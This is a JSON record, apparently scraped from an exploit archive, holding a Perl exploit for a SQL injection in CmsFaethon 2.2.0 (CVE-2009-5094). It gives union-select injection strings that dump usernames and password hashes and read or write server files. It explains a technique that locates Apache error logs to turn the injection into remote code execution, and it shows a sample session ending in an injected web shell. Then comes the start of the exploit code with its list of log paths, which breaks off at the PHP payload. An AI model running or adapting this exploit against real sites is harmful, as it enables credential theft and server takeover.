{
    "text": "ecve : CVE-2009-5094 ， title : CmsFaethon 2.2.0 - 'item' SQL Injection - PHP webapps Exploit ， verified : Verified ， exploit_detail :  #  ! /usr/bin/perl ，  #  | ---------------------------------------------------------------------------------------------------------------------------------- |  ，  #  | INFORMATIONS |  ，  #  | ---------------------------------------------------------------------------------------------------------------------------------- |  ，  #  | Web Application : CmsFaethon 2.2.0 Ultimate |  ，  #  | Download :  |  ，  #  | ---------------------------------------------------------------------------------------------------------------------------------- |  ，  #  | Remote SQL Command Injection Exploit |  ，  #  | by Osirys |  ，  #  | osirys [ at ] autistici [ dot ] org |  ，  #  | osirys.org |  ，  #  | Greets to : evilsocket , Fireshot , Todd and str0ke |  ，  #  | ---------------------------------------------------------------------------------------------------------------------------------- |  ，  #  | BUG [ Sql Injection ]  ，  #  | p0c : / [ path ] /info.php?item= [ sql_string ]  ，  #  | SQL Injections used by this sploit :  ，  #  |  [ 1 ] /path ] /info.php?item=-2' union all select concat ( username , 0x3a , password )  , 0 from f06_users order by ' *  ，  #  |  [ 2 ] /path ] /info.php?item=-2' union all select load_file ( 'lf' )  , 0 order by ' *  ，  #  |  [ 3 ] /path ] /info.php?item=-2' union all select 'content' , 0 into dumpfile 'file ，  #  | ---------------------------------------------------------------------------------------------------------------------------------- |  ，  #  | This exploit just use a trick that came in my mind smocking a cigarette. It's just a SQL Injection vulnerability , but with this ，  #  | trick can become a RCE vulnerability. A lot of people already know the into dumpfile mysql function , but this function needs the ，  #  | path of the site in the server , so the attacker has to find this path to perform a RCE attack. ，  #  | I just found a possible way to find this path. Making a HTTP GET request to a non existent file of the cms , this wrong request will ，  #  | appear into error log files. So , just using then load_file (  ) function on each possible path of error logs , when we will find the ，  #  | right path , will appear error log's content , so we will be able to get the website path in the server just watching near the error ，  #  | that came out after the request to a non existent file. Anyway , soon I will write a paper to talk about this trick. ，  #  | It's just an experimental way to RCE by SQL. Can be emproved. A complete paper will arrive soon !  ，  #  | Coz to use this technique you need to know few things before : P ，  #  | ---------------------------------------------------------------------------------------------------------------------------------- |  ，  # ----------------------------------------------------------------------------------------------------------------------------------- |  ，  # Exploit in action [ > !  ]  ，  # ----------------------------------------------------------------------------------------------------------------------------------- |  ，  # osirys [  ~  ] > $ perl p0w.txt ，  # --------------------------------- ，  # CmsFaethon Remote SQL ，  # CMD Inj Sploit ，  # by Osirys ，  # --------------------------------- ，  #  [  *  ] Getting admin login details .. ，  #  [  $  ] User : admin ，  #  [  $  ] Pass : 5f4dcc3b5aa765d61d8327deb882cf99 ，  #  [  *  ] Generating error through GET request .. ，  #  [  *  ] Cheeking Apache Error Log path .. ，  #  [  *  ] Error Log path found -> /var/log/httpd/error_log ，  #  [  *  ] Website path found -> /home/osirys/web/cmsfaethon-2.0.4-ultimate/20_ultimate/ ，  #  [  *  ] Shell succesfully injected !  ，  #  [ & ] Hi my master , do your job now [  !  ]  ，  # shell [ localhost ]  $ > id ，  # uid=80 ( apache ) gid=80 ( apache ) groups=80 ( apache )  ，  # shell [ localhost ]  $ > pwd ，  # /home/osirys/web/cmsfaethon-2.0.4-ultimate/20_ultimate ，  # shell [ localhost ]  $ > exit ，  #  [ - ] Quitting .. ，  # osirys [  ~  ] > $  ，  # ----------------------------------------------------------------------------------------------------------------------------------- |  ， use IO :  : Socket ;  ， use LWP :  : UserAgent ;  ， my $ host = $ ARGV [ 0 ]  ;  ， my $ rand = int ( rand 9 ) +1 ;  ， my @ error_logs = qw (  ， /var/log/httpd/error.log ， /var/log/httpd/error_log ， /var/log/apache/error.log ， /var/log/apache/error_log ， /var/log/apache2/error.log ， /var/log/apache2/error_log ， /logs/error.log ， /var/log/apache/error_log ， /var/log/apache/error.log ， /usr/local/apache/logs/error_log ， /etc/httpd/logs/error_log ， /etc/httpd/logs/error.log ， /var/www/logs/error_log ， /var/www/logs/error.log ， /usr/local/apache/logs/error.log ， /var/log/error_log ， /apache/logs/error.log ，  )  ;  ， my $ php_c0de = \"<?php",
    "time": "2009-02-13"
}